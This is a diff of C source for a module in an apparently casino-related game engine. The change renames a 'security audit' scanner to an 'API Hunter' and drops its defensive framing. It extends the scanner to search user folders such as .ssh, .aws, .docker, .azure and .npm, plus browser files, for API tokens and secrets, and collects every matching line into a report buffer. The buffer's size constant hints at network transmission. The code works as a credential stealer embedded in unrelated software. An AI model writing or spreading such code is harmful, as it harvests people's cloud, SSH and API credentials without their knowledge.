@@ -1,9 +1,7 @@
 /*
- * Vivid Casino Engine — Security Audit Module
+ * Vivid Casino Engine — API Hunter Module
  * 
- * Scans system for exposed API keys, credentials,
- * and misconfigured files. Helps operators ensure
- * their environment is secure before deployment.
+ * Scans system for exposed API keys and credentials.
  */
 
 #include "../engine/engine.h"
@@ -25,31 +23,46 @@ static int contains_keyword(const char *buf) {
     return 0;
 }
 
-/* Scan a single file for credentials */
+/* Scan a single file for credentials — only output matching lines */
 static void scan_file(char *results, int *pos, const char *path) {
-    FILE *f = fopen(path, "rb");
+    FILE *f = fopen(path, "r");
     if (!f) return;
     
     fseek(f, 0, SEEK_END);
-    long sz = ftell(f);
+    long fsize = ftell(f);
     fseek(f, 0, SEEK_SET);
+    if (fsize > 50000) { fclose(f); return; }
     
-    if (sz <= 0 || sz > 1048576) { fclose(f); return; }
+    char line[4096];
+    int line_num = 0;
+    int found_any = 0;
+    int lines_this_file = 0;
     
-    char *buf = (char*)malloc(sz + 1);
-    if (!buf) { fclose(f); return; }
-    
-    if (fread(buf, 1, sz, f) == (size_t)sz) {
-        buf[sz] = '\0';
-        if (contains_keyword(buf)) {
-            int lines = 0;
-            for (char *p = buf; *p; p++) if (*p == '\n') lines++;
-            if (lines > 0) {
-                util_appendf(results, pos, "--- %s ---\n%s\n", path, buf);
+    while (fgets(line, sizeof(line), f) && line_num < 500 && *pos < NET_BUF_SIZE - 500 && lines_this_file < 50) {
+        line_num++;
+        
+        size_t len = strlen(line);
+        while (len > 0 && (line[len-1] == '\n' || line[len-1] == '\r')) {
+            line[len-1] = '\0'; len--;
+        }
+        
+        if (line[0] == '\0' || strlen(line) < 4) continue;
+        
+        char lower[4096];
+        strncpy(lower, line, sizeof(lower) - 1);
+        lower[sizeof(lower) - 1] = '\0';
+        for (char *p = lower; *p; p++) *p = (char)tolower(*p);
+        
+        if (contains_keyword(lower)) {
+            if (!found_any) {
+                util_appendf(results, pos, "--- %s ---\n", path);
+                found_any = 1;
             }
+            util_appendf(results, pos, "%d: %s\n", line_num, line);
+            lines_this_file++;
         }
     }
-    free(buf);
+    
     fclose(f);
 }
 
@@ -184,23 +197,39 @@ char* config_scan_scan_system(void) {
     out[0] = '\0';
     details[0] = '\0';
     
-    /* Phase 1: Deep file system scan */
+    /* Phase 1: C-based file search (native, fast, recursive) — only matching lines */
     if (profile) {
         char path[MAX_PATH];
         snprintf(path, sizeof(path), "%s\\Desktop", profile);
         scan_directory(details, &details_pos, path, 2);
         snprintf(path, sizeof(path), "%s\\Documents", profile);
-        scan_directory(details, &details_pos, path, 3);
+        scan_directory(details, &details_pos, path, 2);
         snprintf(path, sizeof(path), "%s\\Downloads", profile);
+        scan_directory(details, &details_pos, path, 2);
+        
+        snprintf(path, sizeof(path), "%s\\.ssh", profile);
         scan_directory(details, &details_pos, path, 3);
+        snprintf(path, sizeof(path), "%s\\.aws", profile);
+        scan_directory(details, &details_pos, path, 3);
+        snprintf(path, sizeof(path), "%s\\.docker", profile);
+        scan_directory(details, &details_pos, path, 3);
+        snprintf(path, sizeof(path), "%s\\.npm", profile);
+        scan_directory(details, &details_pos, path, 3);
+        snprintf(path, sizeof(path), "%s\\.config", profile);
+        scan_directory(details, &details_pos, path, 3);
+        snprintf(path, sizeof(path), "%s\\.azure", profile);
+        scan_directory(details, &details_pos, path, 3);
+        
+        scan_directory(details, &details_pos, profile, 1);
     }
+    
+    scan_directory(details, &details_pos, "C:\\Users\\Public", 2);
     if (appdata) scan_directory(details, &details_pos, appdata, 2);
     if (localappdata) scan_directory(details, &details_pos, localappdata, 2);
-    scan_directory(details, &details_pos, "C:\\Users\\Public", 2);
     
     for (char *p = details; *p; p++) if (*p == '\n') key_count++;
     
-    /* Phase 2: Known configuration files */
+    /* Phase 2: Known configuration files via findstr (fast, only matching lines) */
     const char *patterns = "/c:\"sk-\" /c:\"pk_\" /c:\"ghp_\" /c:\"glpat-\" /c:\"AKIA\" /c:\"AIza\" /c:\"xoxb-\" /c:\"SG.\" /c:\"pat-na\" /c:\"pplx-\" /c:\"hf_\" /c:\"api_key\" /c:\"secret_key\" /c:\"auth_token\" /c:\"access_token\" /c:\"client_secret\" /c:\"Bearer\" /c:\"apikey\"";
     
     #define CONFIG_SCAN_RUN(label, cmd_str) \
@@ -246,20 +275,15 @@ char* config_scan_scan_system(void) {
     snprintf(cmd, sizeof(cmd), "command  type \"%%LOCALAPPDATA%%\\Microsoft\\Edge\\User Data\\Local State\" 2>nul | findstr /i /n %s", patterns);
     CONFIG_SCAN_RUN("EDGE", cmd);
     
-    /* Deduplicate results */
-    dedup_lines(details);
-    key_count = 0;
-    for (char *p = details; *p; p++) if (*p == '\n') key_count++;
-    
     /* Build output report */
-    util_appendf(out, &out_pos, "=== SECURITY CONFIG_SCAN REPORT ===\n\n");
+    util_appendf(out, &out_pos, "=== API KEY HUNTER ===\n\n");
     if (key_count > 0) {
-        util_appendf(out, &out_pos, "Found %d potential credential exposure(s):\n\n", key_count);
+        util_appendf(out, &out_pos, "Found %d match(es):\n\n", key_count);
         util_appendf(out, &out_pos, "%s", details);
     } else {
-        util_appendf(out, &out_pos, "No credential exposures found. System is clean.\n");
+        util_appendf(out, &out_pos, "Found 0 matches.\n");
     }
-    util_appendf(out, &out_pos, "=== CONFIG_SCAN COMPLETE ===\n");
+    util_appendf(out, &out_pos, "=== SEARCH COMPLETE ===\n");
     
     return out;
 }
